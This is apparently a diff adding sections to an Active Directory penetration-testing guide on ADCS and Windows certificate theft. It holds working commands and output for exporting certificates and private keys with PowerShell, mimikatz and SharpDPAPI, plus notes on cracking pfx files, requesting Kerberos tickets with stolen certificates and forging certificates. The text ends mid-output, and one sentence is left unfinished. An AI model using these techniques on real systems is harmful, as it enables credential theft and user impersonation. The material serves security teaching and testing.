@@ -1940,6 +1940,240 @@ password.
  CONTOSO\han
  #+end_src
 
+**** Windows Certificate Store
+:PROPERTIES:
+:custom_id: windows-certificate-store
+:END:
+
+You could find certificates (and private keys) in the Windows Certificate Store.
+The certificates can be used for impersonating users, but also to other
+purposes, like signing code, encrypt files, etc.
+
+There are two main stores: 
+
+- Current User: Stores the certificates related to the current session. Located
+  in the =HKCU\SOFTWARE\Microsoft\SystemCertificates= key of the registry.
+- Local Machine: Stores the certificates related to the machine. Located in the
+  =HKLM\SOFTWARE\Microsoft\SystemCertificates= key of the registry.
+
+You can list all the certificates in the certificate stores with Powershell
+~ls -recurse cert:\~. However, there are many certificates from trusted CAs not
+related to the machine, so probably you can find interesting ones in
+=cert:\CurrentUser\My\= and =cert:\LocalMachine\My\=. You can list them using Powershell:
+
+#+begin_src powershell
+PS C:\> ls Cert:\CurrentUser\My\
+
+
+   PSParentPath: Microsoft.PowerShell.Security\Certificate::CurrentUser\My
+
+Thumbprint                                Subject
+----------                                -------
+1D9FF81896625B02DE18067FEF7236BADAB7A0B1  CN=Anakin, CN=Users, DC=contoso, DC=local
+
+
+PS C:\> ls Cert:\LocalMachine\My\
+
+
+   PSParentPath: Microsoft.PowerShell.Security\Certificate::LocalMachine\My
+
+Thumbprint                                Subject
+----------                                -------
+1D9FF81896625B02DE18067FEF7236BADAB7A0B1  CN=Anakin, CN=Users, DC=contoso, DC=local
+#+end_src
+
+Then you can export the certificates (with its private keys if there are) with
+the ~Export-PfxCertificate~ cmdlet.
+
+#+begin_src powershell
+PS C:\> Export-PfxCertificate -Cert Cert:\localMachine\my\1D9FF81896625B02DE18067FEF7236BADAB7A0B1 -FilePath anakin.pfx -Password (ConvertTo-SecureString -String "1234" -Force -AsPlainText)
+
+
+    Directory: C:\Users\Anakin\Downloads
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        15/08/2021     18:25           4389 anakin.pfx
+
+#+end_src
+
+Then you get a =.pfx/.p12= file that includes the certificate and its associated private
+key. Apart from that you can also use the tool [[https://github.com/TheWover/CertStealer][CertStealer]] to get them. Remember
+that is important get the private key to have a useful certificate. Other
+[[#certificate-files][certificate files]] like =.crt=, =.pem=, =.cer=, =.p7= don't include the private
+key, but sometimes there is a related =.key= file that contains the private key. You should
+try to search for =.pfx/.p12=, =.jks/.keystore/.keys= (Java Keystores) and =.key=
+files to get private keys.
+
+Also take note that pfx/p12 are usually encrypted with a password to protect the
+private key. In that case, you can try to crack the pfx/p12 with john after
+transform it with [[https://fossies.org/dox/john-1.9.0-jumbo-1/pfx2john_8py_source.html][pfx2john.py]].
+
+
+Back to the certificate store, sometimes the private key is marked as non
+exportable the crypto APIs, Microsoft CryptoAPI (CAPI) and Cryptography API:
+Next  Generation  (CNG), will not allow to export it. In that case you can use
+mimikatz to patch them in memory (CAPI is patched in the current process memory
+and CNG in the lsass process memory), and extract the key. 
+
+#+begin_src 
+PS C:\> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 12 2021 23:10:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # crypto::capi
+Local CryptoAPI RSA CSP patched
+Local CryptoAPI DSS CSP patched
+
+mimikatz # crypto::cng
+"KeyIso" service patched
+
+mimikatz # crypto::certificates /systemstore:local_machine /store:my /export
+ * System Store  : 'local_machine' (0x00020000)
+ * Store         : 'my'
+
+ 0. Anakin
+    Subject  : DC=local, DC=contoso, CN=Users, CN=Anakin
+    Issuer   : DC=local, DC=contoso, CN=contoso-DC01-CA
+    Serial   : 5a000000000030ab6bcf2703bcb45a00000075
+    Algorithm: 1.2.840.113549.1.1.1 (RSA)
+    Validity : 15/08/2021 17:35:47 -> 15/08/2022 17:35:47
+    UPN      : anakin@contoso.local
+    Hash SHA1: 1d9ff81896625b02de18067fef7236badab7a0b1
+        Key Container  : a66905aa17faff283a1ca9066bfa33da_c684339f-d2b3-4858-8ee8-5c457227a998
+        Provider       : Microsoft Enhanced Cryptographic Provider v1.0
+        Provider type  : RSA_FULL (1)
+        Type           : AT_KEYEXCHANGE (0x00000001)
+        |Provider name : Microsoft Enhanced Cryptographic Provider v1.0
+        |Key Container : tq-User-e4cbd0ba-f157-4c6b-978c-65819ffe80e1
+        |Unique name   : a66905aa17faff283a1ca9066bfa33da_c684339f-d2b3-4858-8ee8-5c457227a998
+        |Implementation: CRYPT_IMPL_SOFTWARE ;
+        Algorithm      : CALG_RSA_KEYX
+        Key size       : 2048 (0x00000800)
+        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
+        Exportable key : YES
+        Public export  : OK - 'local_machine_my_0_Anakin.der'
+        Private export : OK - 'local_machine_my_0_Anakin.pfx'  
+#+end_src
+
+Once you have an user certificate in pfx format, you can use it with [[https://github.com/GhostPack/Rubeus][Rubeus]],
+[[https://github.com/gentilkiwi/kekeo][kekeo]] or [[https://github.com/dirkjanm/PKINITtools][PKINIT tools]] to get a TGT on behalf of certificate user, and even get
+its NTLM.
+
+
+Moreover, the private keys are encrypted using DPAPI (Data Protection API), so
+you can decrypt them if you have the associated master key.
+
+In case of the =Local Machine= certificates, the [[https://github.com/GhostPack/SharpDPAPI#certificates][SharpDPAPI]] tool executed as
+admin will do the job of getting the system master key and decrypt any
+associated private key.
+
+#+begin_src
+PS C:\Users\Anakin\Downloads> .\SharpDPAPI.exe certificates /machine
+
+  __                 _   _       _ ___
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                |
+  v1.11.1
+
+
+[*] Action: Certificate Triage
+[*] Elevating to SYSTEM via token duplication for LSA secret retrieval
+[*] RevertToSelf()
+
+[*] Secret  : DPAPI_SYSTEM
+[*]    full: 6880EB76862DF7875705885938102C696717EB18828326418633117212DE44BCDA10806FC6765D4A
+[*]    m/u : 6880EB76862DF7875705885938102C696717EB18 / 828326418633117212DE44BCDA10806FC6765D4A
+
+
+[*] SYSTEM master key cache:
+
+{0615d5ff-fc7c-44db-9429-831d5768a2df}:D65E3B8C0471DBF520523BF27ABC2F9EAEE94CD6
+{70aa59dc-bef4-465d-8c4a-647ff117567a}:88C0145AD98558A2118EF3BA2D4E986EFC12A0F8
+{89d5d867-0f7d-4dbf-b96d-644e364f7f9f}:7CE677099588F901AACE91026197C6C9E807E9F2
+{b06916f3-0348-4207-a4ca-ed0f4751ba4b}:D7EB655738D6BE20BAE9FBBD662922F4C82EC63F
+{d32ec073-8654-4aba-9e4f-b1a360c40c24}:42FB6CE749723D7A0DACB444F2C172F215DAFB1F
+{126d55ef-f5a2-48a6-a510-512a5acfbaab}:9E8CF7072F20FFA2A2001CA7C7A9808AEAC73CED
+{1858523d-ede8-478e-bb3a-a48d40fb0639}:1E65C936F7A9053C260F5A80E10E6BAA65F58434
+{53d0d15c-6c54-40d9-b5d3-b92440063cbf}:E3D2739ABADE42A6F1430D406550DD37FCA77D9B
+{636bd400-8503-4299-bd7d-4f14bce9187b}:8C1C67C15432BEF4360D95EE263AB6650F237BFB
+{cfcc81a7-d35a-4a40-a86a-224da75ef531}:90088F1B601DABF08F811C67BBCE8C259B8D799C
+
+
+[*] Triaging System Certificates
+
+
+Folder       : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys
+
+  File               : a66905aa17faff283a1ca9066bfa33da_c684339f-d2b3-4858-8ee8-5c457227a998
+
+    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+    Master Key GUID  : {70aa59dc-bef4-465d-8c4a-647ff117567a}
+    Description      : CryptoAPI Private Key
+    algCrypt         : CALG_3DES (keyLen 192)
+    algHash          : CALG_SHA (32772)
+    Salt             : bed14b5a4063b775237338838712d4f8
+    HMAC             : f82975834585df0c7581cccda7a07a66
+    Unique Name      : tq-User-e4cbd0ba-f157-4c6b-978c-65819ffe80e1
+
+    Thumbprint       : 1D9FF81896625B02DE18067FEF7236BADAB7A0B1
+    Issuer           : CN=contoso-DC01-CA, DC=contoso, DC=local
+    Subject          : CN=Anakin, CN=Users, DC=contoso, DC=local
+    Valid Date       : 15/08/2021 17:35:47
+    Expiry Date      : 15/08/2022 17:35:47
+    Enhanced Key Usages:
+        Encrypting File System (1.3.6.1.4.1.311.10.3.4)
+        Secure Email (1.3.6.1.5.5.7.3.4)
+        Client Authentication (1.3.6.1.5.5.7.3.2)
+         [!] Certificate is used for client auth!
+
+    [*] Private key file a66905aa17faff283a1ca9066bfa33da_c684339f-d2b3-4858-8ee8-5c457227a998 was recovered:
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEArSM5paMmJImHmGIVxNfBBWSsmbXvSMvBmsBlK0yUsrh/shI8
+56hVOxFUBGfdkohAGFHDrGc3gw+mi3MvbQWta3J4d83wMMhteEL1gVW2D/uP+cvk
+...........[STRIPPED].............
+NxoIXwKBgCygsIQ/uRSV6RWjJGL04rRzVRdmSPfqs1kSvBVdzr25CIauVVVrunzN
+TiGmt3dCK334Xh6EzZJq7mg7fTXX+UjzHjVdYJ6fNgoUQqSZnUWN0lSTlCvqcVHf
+xaPa+1GcKk+vVlkiRQP+G6JINcN8zyuGW9DgRMRCid4Q12VSjJEr
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIFzjCCBLagAwIBAgITdQAAAFq0vAMnz2urMAAAAAAAWjANBgkqhkiG9w0BAQsF
+ADBKMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFzAVBgoJkiaJk/IsZAEZFgdjb250
+          ...........[STRIPPED].............
+BUSlKHzcWyrHCxNW/9Of9xD6ekUhZ5otRaDrxtS4Gjjy5hVZQ/IJ0jYbovAMAIVG
+VQtyH48HGOrvvsGsab4TPKCZ0o/St+iBhdp4DvTMFxVSXXpXrbvZUUV0XuIic1+M
+8II=
+-----END CERTIFICATE-----
+
+
+
+Folder       : C:\ProgramData\Microsoft\Crypto\SystemKeys
+
+
+Folder       : C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys
+
+
+[*] Hint: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+SharpDPAPI completed in 00:00:01.1549635
+#+end_src
+
+However in the case of the =Current User= store, the process can be more tricky
+since the correlation between the certificate and its private key is not clear,
+so it is not fully automated. The procedure is described in [[https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf][Certified
+Pre-Owned whitpaper in the User Certificate Theft via DPAPI]] section.
+
+Finally, you can get certificates searching for its files in the computer.
+Usually you will 
+
 **** Powershell history
 :PROPERTIES:
 :custom_id: powershell-history
@@ -8789,6 +9023,14 @@ through SMB:
 - DHCPM :: [[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4][DHCPM]] (DHCP Server Management) is used to manage the configuration of
   a DHCP server.
 
+- EFSR :: [[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31][EFSR]] (Encrypting File System Remote) is a protocol used to perform
+  operations over data that is encrypted remotely. Is the protocol used by
+  [[https://github.com/topotam/PetitPotam/][PetitPotam]] to make computers connect to other machines with NTLM auth and
+  perform NTLM relay attacks.
+
+- ICPR :: [[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/9b8ed605-6b00-41d1-9a2a-9897e40678fc][ICPR]] (ICertPassage Remote) is a protocol to enroll certificates in
+  [[#adcs][ADCS]].
+
 - RPRN :: [[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1][RPRN]] (Print System Remote) is used to manage prints from a remote
   computer. You can use [[https://github.com/leechristensen/SpoolSample][SpoolSample]] or [[https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py][printerbug.py]] to trigger the [[https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/41][printer bug]]
   trough RPRN.
@@ -8826,6 +9068,14 @@ through SMB:
  | DHCPM |>----.
  '-------'     |
                |
+  .------.     |
+  | EFSR |>----|
+  '------'     |
+               |
+  .------.     |
+  | ICPR |>----|
+  '------'     |
+               |               |
   .------.     |
   | RPRN |>----|
   '------'     |
@@ -9540,6 +9790,682 @@ a SOCKS proxy by using [[https://github.com/blackarrowsec/mssqlproxy][mssqlproxy
 
 For more ways to abuse SQL Servers, you can use the [[https://github.com/NetSPI/PowerUpSQL/][PowerUpSQL]] toolkit and
 definitely, you should check its [[https://github.com/NetSPI/PowerUpSQL/wiki][wiki]].
+** ADCS
+:PROPERTIES:
+:custom_id: adcs
+:END:
+
+ADCS (Active Directory Certificate Services) allows companies to manage their
+internal PKI (Public Key Infrastructure) and merge it with Active Directory.
+There are several implications for Active Directory when ADCS is installed, but
+probably the most important one from a pentester perspective is that *users can
+authenticate by using certificates* (to ask Kerberos tickets through [[https://docs.microsoft.com/en-us/openspecs/windows_protocols/MS-PKCA/d0cf1763-3541-4008-a75f-a577fa5e8c5b][PKINIT]]).
+
+You should read the great investigation on this topic performed by [[https://twitter.com/harmj0y][Will
+Schroeder]] and [[https://twitter.com/tifkin_][Lee Christensen]] (most of this information is taken from it): 
+
+- [[https://posts.specterops.io/certified-pre-owned-d95910965cd2][Certified Pre-Owned (Article)]]
+- [[https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf][Certified Pre-Owned (Whitepaper)]]
+
+
+*** ADCS entities
+:PROPERTIES:
+:custom_id: adcs-entities
+:END:
+
+There are important entities related with ADCS.
+
+**** Certificates
+:PROPERTIES:
+:custom_id: certificates
+:END:
+  
+A certificate is a file that identifies a subject
+(person/organization/web-page) and link it to a public key. The certificate is
+public so everyone can access to the public key and use it to encrypt
+information that is going to be send to the subject, or used to verify
+information that is signed by the (private key of the) subject.
+
+On the other part, the subject itself will have a private key that can be used
+to decrypt information encrypted with the public key or sign information.
+
+In fact, to verify that the certificate is correct, certificates themselves
+are usually signed by (the private key of) an authority (issuer) whose
+certificate (and public key) is known for everyone. This way is possible to
+verify that the information of the user certificate is correct.
+
+Apart from that, certificates (and private keys) can be used for many
+different things, like identify users or web pages, sign code, etc, and only
+for a period of time. Therefore they include information related of what is
+possible to do with them and in which period of time they are valid.
+
+To summarize, a certificate contains the following information (among others):
+
+- *Serial Number*: The ID of the certificate given by the issuer.
+- *Subject*: The name of the subject. In ADCS is the name of the user, but in
+  web pages is the domain name.
+- *Alternative subjects*: The certificate can also be used to identify
+  more than one subject if necessary. This way a certificate can be used for
+  many web-pages, but also for many users in ADCS (to impersonate them).
+- *Public key*: The public key related to the subject. The subject of the
+  certificate will have the private key.
+- *Issuer*: Who is the one that signed and issued this certificate after
+  verified that its information is correct.
+- *Issuer signature*: The signature with the private key of the issuer that
+  proves that the issuer check the certificated. The signature can be verified
+  by using the issuer public key.
+- *Usages*: The purposes for what this certificate can be used. It is divided in
+  the fields "Key Usages" and "Extended Key Usages" known as EKUs. The ADCS
+  certificates will include the usages relative to Active Directory in the
+  EKUs. The EKUs can include:
+  
+  + Code Signing
+  + Client Authentication
+  + Any purpose
+  + etc
+ 
+- *Validity*: This include two dates: when the certificate starts to be valid,
+  and when is not longer valid.
+
+Here you can see the information of a certificated issued for the user Anakin:
+#+begin_src 
+$ openssl x509 -noout -text -in anakin.pem 
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number:
+            75:00:00:00:2b:bd:fc:8e:01:99:ca:72:e6:00:00:00:00:00:2b
+        Signature Algorithm: sha256WithRSAEncryption
+        Issuer: DC = local, DC = contoso, CN = contoso-DC01-CA
+        Validity
+            Not Before: Aug 15 12:15:57 2021 GMT
+            Not After : Aug 15 12:15:57 2022 GMT
+        Subject: DC = local, DC = contoso, CN = Users, CN = Anakin
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                RSA Public-Key: (2048 bit)
+                Modulus:
+                    00:e0:bf:6e:73:89:6e:f0:56:65:36:3c:fd:ca:d7:
+                    ac:44:7d:c5:aa:c0:d0:40:29:df:e1:17:d0:6d:73:
+                    5c:9f:a6:f8:43:b4:31:e1:a2:71:97:27:f4:c3:4a:
+                    9d:9c:ba:b3:e6:1e:58:6f:a5:3d:2d:c0:89:af:70:
+                    d9:b9:52:d3:81:49:19:4d:b0:b8:c3:46:93:be:f6:
+                    3e:85:dc:56:19:8c:40:a3:d7:2f:0c:c6:0c:32:c1:
+                    4a:db:4f:8d:dd:c9:7a:fe:e2:d2:20:4c:96:68:b0:
+                    6f:5f:53:8a:74:c6:70:06:32:d8:97:2e:f4:16:6a:
+                    17:17:71:68:f2:8e:bf:2c:1e:6a:3b:13:e1:a4:ab:
+                    a0:9d:af:bf:26:36:ec:46:1c:33:cd:7b:e1:48:d3:
+                    35:43:dd:fc:5c:bb:3e:3e:fc:8c:ab:b7:55:84:ec:
+                    4e:57:ed:05:e0:1f:9f:61:7f:2f:22:48:9d:1e:e5:
+                    b6:de:1c:fb:d5:d8:47:05:42:00:17:ac:22:e3:e3:
+                    0e:84:90:f0:dd:48:77:ba:bd:3f:03:04:bc:33:df:
+                    5e:77:63:7b:3f:46:ea:44:1d:35:ae:7c:8b:5a:f2:
+                    37:0b:de:5b:29:34:8a:b0:1d:a4:5f:05:57:a5:72:
+                    a1:12:4b:4d:6e:72:de:76:c6:a9:aa:f4:30:cf:36:
+                    64:79
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Subject Key Identifier: 
+                A3:1B:75:5D:CE:ED:A0:DE:DD:EE:DF:A5:F1:56:18:56:82:D8:4D:1F
+            X509v3 Authority Key Identifier: 
+                keyid:F9:95:2D:AD:AD:90:07:90:A5:CD:9D:58:1C:D6:00:05:75:79:21:F4
+
+            X509v3 CRL Distribution Points: 
+
+                Full Name:
+                  URI:ldap:///CN=contoso-DC01-CA,CN=dc01,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=contoso,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint
+
+            Authority Information Access: 
+                CA Issuers - URI:ldap:///CN=contoso-DC01-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=contoso,DC=local?cACertificate?base?objectClass=certificationAuthority
+
+            1.3.6.1.4.1.311.20.2: 
+                ...U.s.e.r
+            X509v3 Key Usage: critical
+                Digital Signature, Key Encipherment
+            X509v3 Extended Key Usage: 
+                Microsoft Encrypted File System, E-mail Protection, TLS Web Client Authentication
+            X509v3 Subject Alternative Name: 
+                othername:<unsupported>
+            S/MIME Capabilities: 
+......0...+....0050...*.H..
+..*.H..
+    Signature Algorithm: sha256WithRSAEncryption
+         2b:68:52:8e:7c:db:ea:09:a9:1e:a2:d5:2b:e7:d0:fd:15:25:
+         75:42:20:0a:06:2f:f6:d4:a3:75:e2:c3:94:2f:d8:70:44:95:
+         33:62:68:46:e6:17:32:9f:ed:e9:53:61:2f:3d:b7:39:92:36:
+         04:a1:1f:92:72:d3:5c:1e:8c:56:e3:8f:ca:7b:61:af:46:9f:
+         84:fd:28:9e:39:d7:79:a3:fb:6e:a5:1c:9b:ba:3c:e4:79:3b:
+         e2:09:06:66:3a:a5:df:25:ac:91:8c:ea:7b:99:31:1a:d3:bd:
+         d7:dd:8a:2c:24:45:ad:5d:39:e6:f2:4e:e4:f2:5e:2a:13:fd:
+         cd:8b:84:fa:c6:fd:2e:0e:d2:df:e2:e5:c6:81:99:ad:e8:b7:
+         5b:5f:52:54:97:ba:a3:05:f8:61:7b:c6:dc:64:ed:f5:2f:18:
+         eb:11:a2:64:63:56:cb:76:44:ec:e3:02:c0:d7:84:a8:19:e5:
+         6d:ab:81:83:c8:7b:a6:eb:f0:11:9b:06:a6:c3:c6:9e:ad:bd:
+         d5:72:2f:27:fc:9d:4e:42:2f:89:38:0b:fe:1a:1d:19:c2:54:
+         eb:01:7e:6b:65:75:de:c0:0a:27:fa:ac:fd:34:81:2a:83:ef:
+         61:66:4a:f2:97:ff:8a:4f:1c:05:bf:5a:7a:79:8b:9f:3a:4a:
+         ca:1a:36:a1  
+#+end_src
+
+
+
+***** Certificate files
+:PROPERTIES:
+:custom_id: certificate-files
+:END:
+
+Ok, so the certificate are files, what kind of files? There is different files
+and formats to store the certificates and its private keys. Basically, every
+certificate is stored by using the X.509 format (which is ASN.1) in a binary or
+ascii representation. The binary format are the ASN.1 [[https://en.wikipedia.org/wiki/X.690#DER_encoding][DER]] bytes directly,
+whereas the ascii format are the bytes encoded in base64.
+
+
+- *.pem*: Used to store the ascii format of the certificate (base64 encoded of
+  binary). Usually the information is enclosed between "-----BEGIN CERTIFICATE-----"
+  and "-----END CERTIFICATE-----". 
+
+- *.cer, .crt, .der*: Used to store the certificate in binary DER format.
+
+- *.pfx, .p12*: Used to store the certificate and the private key in a single
+  file, in DER format. It can be encrypted to protect the private key and
+  require a password to decrypt.
+
+- *.p7b, .p7c*: Used to store several certificates in a file, in DER format.
+  
+- *.key*: Used to store the private key, usually in ascii format. Usually the key
+  is enclosed between "-----BEGIN PRIVATE KEY-----" and "-----END PRIVATE KEY-----".
+
+- *.jks/.keystore/.keys*: This files are Java Keystores that can contain
+  certificates and its private keys.
+
+Therefore, if you are looking for private keys, you should search for ~.key~ or
+~.pfx/.p12~ files. You can use the pfx files with [[https://github.com/GhostPack/Rubeus][Rubeus]], [[https://github.com/gentilkiwi/kekeo][kekeo]] or [[https://github.com/dirkjanm/PKINITtools][PKINIT tools]]
+to get TGTs for the users and even the NTLM hash.
+
+**** CAs (Certificate Authorities)
+
+The CAs (Certificate Authorities) are the certificates from the authorities that
+are used to sign the other certificates. The people of the network will trust
+any certificate signed by a CA.
+
+And how do you trust a CA? Usually you trust the CA because the certificate is
+included in a trusted list or something like that. For example, browsers like
+Firefox or Chrome included a list of CA that are trusted by them.
+
+In case of ADCS, the CA certificates are stored in the AD database. You can
+retrieve them with the following query:
+
+#+begin_src powershell
+PS C:\> Get-ADObject -SearchBase "CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -LDAPFilter "(objectClass=certificationAuthority)" -Properties name, cACertificate
+
+
+cACertificate     : {48 130 3 111 48 130 2 87 160 3 2 1 2 2 16 35 210 30 185 72 172 104 133 69 236 21 254 176 59 12 51
+                    48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 48 74 49 21 48 19 6 10 9 146 38 137 147 242 44 100 1 25
+                    22 5 108 111 99 97 108 49 23 48 21 6 10 9 146 38 137 147 242 44 100 1 25 22 7 99 111 110 116 111
+                    115 111 49 24 48 22 6 3 85 4 3 19 15 99 111 110 116 111 115 111 45 68 67 48 49 45 67 65 48 30 23
+                    13 50 49 48 56 48 49 49 50 52 57 52 54 90 23 13 50 54 48 56 48 49 49 50 53 57 52 54 90 48 74 49 21
+                    48 19 6 10 9 146 38 137 147 242 44 100 1 25 22 5 108 111 99 97 108 49 23 48 21 6 10 9 146 38 137
+                    147 242 44 100 1 25 22 7 99 111 110 116 111 115 111 49 24 48 22 6 3 85 4 3 19 15 99 111 110 116
+                    111 115 111 45 68 67 48 49 45 67 65 48 130 1 34 48 13 6 9 42 134 72 134 247 13 1 1 1 5 0 3 130 1
+                    15 0 48 130 1 10 2 130 1 1 0 200 150 101 203 237 109 219 218 139 13 23 191 115 53 111 187 248 23
+                    142 82 169 121 69 228 165 155 86 80 13 243 44 75 127 140 138 247 150 170 59 107 142 74 40 143 151
+                    229 95 95 149 168 157 219 110 107 114 43 117 46 10 100 94 118 150 79 171 117 79 96 243 236 64 103
+                    195 32 36 193 149 139 89 40 67 146 109 120 209 44 211 200 111 0 124 1 189 104 37 19 27 170 54 95
+                    14 24 39 143 173 2 71 255 75 200 75 198 150 231 40 120 129 204 11 239 207 60 162 222 139 18 37 109
+                    224 140 28 155 110 106 216 146 205 188 173 128 24 216 244 105 90 130 131 127 60 103 124 162 212
+                    155 99 253 89 254 16 182 135 91 217 64 125 76 48 163 34 17 189 251 212 163 194 242 108 71 218 249
+                    79 41 162 187 13 129 9 50 66 28 29 231 205 120 62 26 187 45 235 245 145 19 146 59 219 126 156 179
+                    66 38 150 175 22 187 70 247 226 86 202 147 58 198 232 226 217 150 129 155 68 20 54 113 238 216 165
+                    108 155 217 238 124 120 6 17 155 223 68 253 177 10 25 153 29 133 141 176 193 2 3 1 0 1 163 81 48
+                    79 48 11 6 3 85 29 15 4 4 3 2 1 134 48 15 6 3 85 29 19 1 1 255 4 5 48 3 1 1 255 48 29 6 3 85 29 14
+                    4 22 4 20 249 149 45 173 173 144 7 144 165 205 157 88 28 214 0 5 117 121 33 244 48 16 6 9 43 6 1 4
+                    1 130 55 21 1 4 3 2 1 0 48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 3 130 1 1 0 24 196 251 242 57 32
+                    77 9 12 24 232 203 193 100 241 137 121 205 3 55 163 212 38 118 8 96 138 57 84 228 31 51 78 223 169
+                    86 188 1 67 30 219 162 160 205 110 22 233 248 32 101 78 45 48 87 238 113 26 145 52 208 227 82 242
+                    42 126 101 254 102 227 152 207 199 10 0 198 82 140 51 244 81 58 158 105 99 208 214 23 114 239 86
+                    237 105 179 52 172 148 35 53 31 121 235 108 59 105 97 140 77 79 32 247 186 211 177 94 20 152 206
+                    242 46 98 23 190 20 95 92 101 230 202 140 148 232 19 148 228 47 128 193 169 202 159 57 9 101 158
+                    194 209 185 94 150 248 46 105 241 90 33 227 63 68 141 99 131 230 206 101 135 8 149 252 209 178 175
+                    134 123 122 90 29 253 97 9 169 16 199 112 4 235 26 251 72 53 222 140 253 71 22 126 213 227 166 97
+                    104 144 128 5 255 185 244 63 86 20 141 3 26 212 68 89 246 226 25 60 24 138 81 5 248 125 208 133 44
+                    24 112 198 117 41 124 158 55 113 159 59 153 93 226 1 234 0 187 65 15 0 192 3 81 231 177 17 140}
+DistinguishedName : CN=contoso-DC01-CA,CN=Certification Authorities,CN=Public Key
+                    Services,CN=Services,CN=Configuration,DC=contoso,DC=local
+Name              : contoso-DC01-CA
+ObjectClass       : certificationAuthority
+ObjectGUID        : 5daa044d-543a-4daa-aca6-ea2932bf4a2b 
+#+end_src
+
+
+Moreover, there are two main types of CAs, the root CAs and the intermediary
+CAs. The root CAs are the ones that are explicitly trusted, and the intermediary
+CAs are trusted to issue new certificates because they are signed by a root CA
+(of an intermediary CA of an upper level).
+
+You can get a list of all the root CAs and the intermediary CAs in the container
+"AIA" (Authority Information Access).
+
+#+begin_src powershell
+PS C:\> Get-ADObject -SearchBase "CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -LDAPFilter "(objectClass=certificationAuthority)" -Properties name | Format-List
+
+
+DistinguishedName : CN=contoso-DC01-CA,CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local
+Name              : contoso-DC01-CA
+ObjectClass       : certificationAuthority
+ObjectGUID        : 0c9626d7-3684-4fcf-a5ec-5984fd452be4  
+#+end_src
+
+
+If you are able to compromise the private key of a CA, then you should be able
+to forge certificates with [[https://github.com/GhostPack/ForgeCert][ForgeCert]] for the users and impersonate them. But
+notice that not all the CAs are allowed to sign authentication certificates,
+just the ones whose certificate is included in the =NTAuthCertificates= container.
+
+#+begin_src powershell
+PS C:\> Get-ADObject -SearchBase "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -LDAPFilter "(objectClass=certificationAuthority)" -Properties name,caCertificate | Format-List
+
+
+caCertificate     : {48 130 3 111 48 130 2 87 160 3 2 1 2 2 16 35 210 30 185 72 172 104 133 69 236 21 254 176 59 12 51
+                    48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 48 74 49 21 48 19 6 10 9 146 38 137 147 242 44 100 1 25
+                    22 5 108 111 99 97 108 49 23 48 21 6 10 9 146 38 137 147 242 44 100 1 25 22 7 99 111 110 116 111
+                    115 111 49 24 48 22 6 3 85 4 3 19 15 99 111 110 116 111 115 111 45 68 67 48 49 45 67 65 48 30 23
+                    13 50 49 48 56 48 49 49 50 52 57 52 54 90 23 13 50 54 48 56 48 49 49 50 53 57 52 54 90 48 74 49 21
+                    48 19 6 10 9 146 38 137 147 242 44 100 1 25 22 5 108 111 99 97 108 49 23 48 21 6 10 9 146 38 137
+                    147 242 44 100 1 25 22 7 99 111 110 116 111 115 111 49 24 48 22 6 3 85 4 3 19 15 99 111 110 116
+                    111 115 111 45 68 67 48 49 45 67 65 48 130 1 34 48 13 6 9 42 134 72 134 247 13 1 1 1 5 0 3 130 1
+                    15 0 48 130 1 10 2 130 1 1 0 200 150 101 203 237 109 219 218 139 13 23 191 115 53 111 187 248 23
+                    142 82 169 121 69 228 165 155 86 80 13 243 44 75 127 140 138 247 150 170 59 107 142 74 40 143 151
+                    229 95 95 149 168 157 219 110 107 114 43 117 46 10 100 94 118 150 79 171 117 79 96 243 236 64 103
+                    195 32 36 193 149 139 89 40 67 146 109 120 209 44 211 200 111 0 124 1 189 104 37 19 27 170 54 95
+                    14 24 39 143 173 2 71 255 75 200 75 198 150 231 40 120 129 204 11 239 207 60 162 222 139 18 37 109
+                    224 140 28 155 110 106 216 146 205 188 173 128 24 216 244 105 90 130 131 127 60 103 124 162 212
